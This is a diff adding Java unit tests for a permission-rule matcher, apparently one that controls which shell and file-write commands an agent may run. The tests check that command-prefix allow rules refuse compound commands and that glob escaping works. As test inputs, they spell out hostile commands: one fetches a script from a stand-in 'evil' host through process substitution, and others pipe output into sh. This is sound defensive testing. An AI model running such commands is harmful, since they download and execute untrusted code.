@@ -175,4 +175,52 @@ class PermissionRuleTest {
         assertFalse(r.matches("Write", "report0.md", true, ROOT), "不得误放开别的文件");
         assertFalse(r.matches("Write", "report2.md", true, ROOT));
     }
+
+    @Test
+    void processSubstitutionIsACompoundCommand() {    // N1
+        PermissionRule cat = PermissionRule.parse(
+                "Bash(cat:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(cat.matches("Bash", "cat <(curl -s http://evil/s.sh)", false, ROOT),
+                "进程替换 <(…) 会执行命令，必须按复合命令拒绝");
+        PermissionRule tee = PermissionRule.parse(
+                "Bash(tee:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(tee.matches("Bash", "tee >(sh)", false, ROOT));
+        // 普通重定向不引出新命令，仍走前缀规则，其落点风险归 DangerousPaths
+        PermissionRule echo = PermissionRule.parse(
+                "Bash(echo:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertTrue(echo.matches("Bash", "echo hi > /tmp/x", false, ROOT));
+    }
+
+    @Test
+    void separatorGuardCoversEachSeparatorIndependently() {   // M4
+        PermissionRule r = PermissionRule.parse(
+                "Bash(ls:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(r.matches("Bash", "ls | sh", false, ROOT), "单独的 | 必须被拦");
+        assertFalse(r.matches("Bash", "ls \r sh", false, ROOT), "单独的 \\r 必须被拦");
+        assertFalse(r.matches("Bash", "ls & sh", false, ROOT));
+    }
+
+    @Test
+    void underscoreCountsAsWordCharacter() {          // M4
+        PermissionRule r = PermissionRule.parse(
+                "Bash(my_:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(r.matches("Bash", "my_evil", false, ROOT),
+                "下划线是词字符，不构成边界");
+    }
+
+    @Test
+    void escapeGlobCoversEveryMetacharacter() {       // M4
+        for (String name : new String[]{
+                "notes*.md", "a?.md", "x{1,2}.md", "b[i].md", "c\\d.md"}) {
+            PermissionRule r = PermissionRule.parse(
+                    "Write(" + PermissionRule.escapeGlob(name) + ")",
+                    PermissionBehavior.ALLOW, RuleScope.SESSION);
+            assertTrue(r.matches("Write", name, true, ROOT), "必须命中自己：" + name);
+        }
+        PermissionRule star = PermissionRule.parse(
+                "Write(" + PermissionRule.escapeGlob("notes*.md") + ")",
+                PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(star.matches("Write", "notesXYZ.md", true, ROOT),
+                "转义后的 * 不得再当通配符");
+    }
 }
